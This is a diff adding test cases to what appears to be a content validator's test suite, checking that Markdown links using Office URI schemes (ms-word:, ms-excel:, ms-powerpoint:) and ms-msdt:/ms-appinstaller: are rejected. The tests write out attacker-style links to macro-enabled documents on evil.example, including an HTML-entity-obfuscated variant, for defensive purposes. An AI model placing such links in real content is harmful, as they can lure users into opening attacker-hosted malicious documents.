@@ -376,6 +376,13 @@ rejects('See [x](ms-msdt:/id PCWDiagnostic).', 'plain ms-msdt:');
 rejects('See [x](ms-appinstaller://evil.example/x.msix).', 'plain ms-appinstaller:');
 rejects('See [x](ms-m&#115;dt:/id).', 'entity-obfuscated ms-msdt:');
 accepts('Forms-msdt and other terms ending in ms are described here only as prose.', 'benign words ending in ms are not the ms- scheme');
+// The Office URI schemes (ms-word:/ms-excel:/…) launch the local Office app pointed
+// at an attacker-hosted, potentially macro-enabled document — blocked like ms-msdt:.
+rejects('See [x](ms-word:ofe|u|https://evil.example/x.docm).', 'plain ms-word: Office scheme');
+rejects('See [x](ms-excel:ofv|u|https://evil.example/x.xlsm).', 'plain ms-excel: Office scheme');
+rejects('See [x](ms-powerpoint:ofe|u|https://evil.example/x.pptm).', 'plain ms-powerpoint: Office scheme');
+rejects('See [x](ms-w&#111;rd:ofe|u|https://evil.example/x.docm).', 'entity-obfuscated ms-word: Office scheme');
+accepts('Microsoft Word, Excel, and PowerPoint are described here only as prose.', 'benign Office app names are not the ms- schemes');
 
 // MDX expression braces execute at build time in article bodies. They are only
 // allowed when escaped as literal prose or inside Markdown code examples.
